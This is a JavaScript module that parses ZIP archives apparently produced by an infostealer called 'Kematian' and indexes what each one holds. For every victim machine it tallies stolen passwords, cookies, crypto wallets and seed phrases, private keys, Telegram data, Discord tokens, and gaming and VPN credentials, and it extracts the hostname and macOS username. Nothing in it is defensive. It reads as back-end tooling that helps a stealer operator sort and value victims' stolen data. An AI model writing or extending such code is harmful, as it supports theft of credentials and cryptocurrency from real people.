"use strict";

const AdmZip = require("adm-zip");

function safeJson(buf) {
  if (!buf || !buf.length) return null;
  try {
    return JSON.parse(buf.toString("utf8"));
  } catch {
    return null;
  }
}

function extractMacUsername(harvest) {
  const paths = [];
  const r = harvest?.result;
  if (!r) return null;

  for (const f of r.files || []) {
    if (f.path) paths.push(f.path);
  }
  for (const w of r.wallets || []) {
    if (w.path) paths.push(w.path);
  }
  for (const t of r.telegram || []) {
    if (t.path) paths.push(t.path);
  }

  for (const p of paths) {
    const m = p.match(/\/Users\/([^/]+)\//);
    if (m && m[1] && m[1] !== "Shared") return m[1];
  }
  return null;
}

function countGaming(g) {
  if (!g) return 0;
  let n = g.steam ? 1 : 0;
  n += (g.battleNet || []).length;
  n += (g.epic || []).length;
  n += (g.riot || []).length;
  n += (g.uplay || []).length;
  return n;
}

function countVPNs(v) {
  if (!v) return 0;
  return (v.nordvpn || []).length + (v.wireguard || []).length +
    (v.openvpn || []).length + (v.mullvad || []).length;
}

function parseSummaryText(text) {
  if (!text) return {};
  const out = {};
  const hostMatch = text.match(/Kematian harvest — (.+?) \(/);
  if (hostMatch) out.hostname = hostMatch[1].trim();

  const pairs = [
    ["passwords", /passwords:\s*(\d+)/i],
    ["cookies", /cookies:\s*(\d+)/i],
    ["wallet_extensions", /wallet extensions:\s*(\d+)/i],
    ["desktop_wallets", /desktop wallets:\s*(\d+)/i],
    ["seeds", /seeds:\s*(\d+)/i],
    ["telegram", /telegram:\s*(\d+)/i],
    ["discord", /discord:\s*(\d+)/i],
    ["keys", /keys:\s*(\d+)/i],
    ["candidates", /pw candidates:\s*(\d+)/i],
    ["gaming", /gaming:\s*(\d+)/i],
    ["vpns", /vpns:\s*(\d+)/i],
  ];
  for (const [key, re] of pairs) {
    const m = text.match(re);
    if (m) out[key] = parseInt(m[1], 10);
  }
  return out;
}

function parseHostnameFromFilename(filename) {
  if (!filename) return null;
  const base = filename.replace(/\.zip$/i, "").replace(/-part\d+$/i, "");
  const m = base.match(/^(.+)-kematian-/);
  if (m) return m[1].replace(/_/g, " ");
  if (base.includes("-telegram-")) {
    return base.split("-telegram-")[0].replace(/-kematian-.*$/, "");
  }
  return null;
}

function parseArchFromFilename(filename) {
  if (!filename) return null;
  const m = filename.match(/-kematian-([a-z0-9_]+)/i);
  return m ? m[1] : null;
}

function parsePhaseFromFilename(filename, title) {
  if (filename?.includes("-files")) return "files";
  if (filename?.includes("-telegram-")) return "telegram";
  if ((title || "").toLowerCase().includes("telegram")) return "telegram";
  if ((title || "").toLowerCase().includes("files")) return "files";
  return "harvest";
}

function parsePartFromSummary(summary) {
  const m = (summary || "").match(/Part\s+(\d+)\/(\d+)/i);
  if (!m) return { part_num: 1, part_total: 1 };
  return { part_num: parseInt(m[1], 10), part_total: parseInt(m[2], 10) };
}

function buildStatsFromHarvest(harvest, seeds) {
  const r = harvest?.result || {};
  const walletCount = (r.wallets || []).length;
  const extensionCount = (r.extensions || []).length;
  const seedCount = (seeds || harvest?.seeds || []).length;
  const telegramCount = (r.telegram || []).length;
  const discordCount = (r.discordTokens || []).length;
  const keyCount = (r.keys || []).length;
  const gamingCount = countGaming(r.gaming);
  const vpnCount = countVPNs(r.vpns);

  return {
    hostname: harvest?.hostname || null,
    os: harvest?.os || "darwin",
    arch: harvest?.arch || null,
    mac_username: extractMacUsername(harvest),
    password_count: (r.passwords || []).length,
    cookie_count: (r.cookies || []).length,
    wallet_count: walletCount,
    extension_count: extensionCount,
    seed_count: seedCount,
    key_count: keyCount,
    telegram_count: telegramCount,
    candidate_count: (r.passwordCandidates || []).length,
    gaming_count: gamingCount,
    vpn_count: vpnCount,
    has_wallet: walletCount > 0 || extensionCount > 0 ? 1 : 0,
    has_seeds: seedCount > 0 ? 1 : 0,
    has_telegram: telegramCount > 0 ? 1 : 0,
    has_discord: discordCount > 0 ? 1 : 0,
    has_keys: keyCount > 0 ? 1 : 0,
    has_gaming: gamingCount > 0 ? 1 : 0,
    has_vpn: vpnCount > 0 ? 1 : 0,
    stats_json: JSON.stringify({
      passwords: (r.passwords || []).length,
      cookies: (r.cookies || []).length,
      wallets: walletCount,
      extensions: extensionCount,
      seeds: seedCount,
      keys: keyCount,
      telegram: telegramCount,
      discord: discordCount,
      candidates: (r.passwordCandidates || []).length,
      gaming: gamingCount,
      vpns: vpnCount,
      apps: (r.appCredentials || []).length,
      errors: (r.errors || []).length,
    }),
  };
}

function parseZipBuffer(buffer, meta = {}) {
  const zip = new AdmZip(buffer);
  const entries = zip.getEntries();

  let harvest = null;
  let summaryText = null;

  for (const e of entries) {
    if (e.isDirectory) continue;
    const name = e.entryName.replace(/\\/g, "/");
    if (name === "harvest.json" || name.endsWith("/harvest.json")) {
      harvest = safeJson(e.getData());
    }
    if (name === "summary.txt" || name.endsWith("/summary.txt")) {
      summaryText = e.getData().toString("utf8");
    }
  }

  const summaryParsed = parseSummaryText(summaryText || meta.summary || "");
  const part = parsePartFromSummary(meta.summary || summaryText || "");

  let stats = {};
  if (harvest) {
    stats = buildStatsFromHarvest(harvest, harvest.seeds);
  } else if (summaryText || meta.summary) {
    const ext = summaryParsed.wallet_extensions || 0;
    const desk = summaryParsed.desktop_wallets || 0;
    const seeds = summaryParsed.seeds || 0;
    const tg = summaryParsed.telegram || 0;
    const dc = summaryParsed.discord || 0;
    const keys = summaryParsed.keys || 0;
    const gaming = summaryParsed.gaming || 0;
    const vpns = summaryParsed.vpns || 0;
    stats = {
      hostname: summaryParsed.hostname,
      password_count: summaryParsed.passwords || 0,
      cookie_count: summaryParsed.cookies || 0,
      wallet_count: desk,
      extension_count: ext,
      seed_count: seeds,
      key_count: keys,
      telegram_count: tg,
      candidate_count: summaryParsed.candidates || 0,
      gaming_count: gaming,
      vpn_count: vpns,
      has_wallet: ext + desk > 0 ? 1 : 0,
      has_seeds: seeds > 0 ? 1 : 0,
      has_telegram: tg > 0 ? 1 : 0,
      has_discord: dc > 0 ? 1 : 0,
      has_keys: keys > 0 ? 1 : 0,
      has_gaming: gaming > 0 ? 1 : 0,
      has_vpn: vpns > 0 ? 1 : 0,
      stats_json: JSON.stringify(summaryParsed),
    };
  }

  const hostname =
    meta.hostname ||
    stats.hostname ||
    parseHostnameFromFilename(meta.filename) ||
    "unknown";

  const arch =
    meta.arch ||
    stats.arch ||
    parseArchFromFilename(meta.filename) ||
    "mac";

  const phase =
    meta.phase ||
    parsePhaseFromFilename(meta.filename, meta.title);

  return {
    hostname,
    os: meta.os || stats.os || "darwin",
    arch,
    mac_username: stats.mac_username || null,
    phase,
    part_num: meta.part_num || part.part_num,
    part_total: meta.part_total || part.part_total,
    ...stats,
  };
}

module.exports = {
  parseZipBuffer,
  parseHostnameFromFilename,
  parsePhaseFromFilename,
};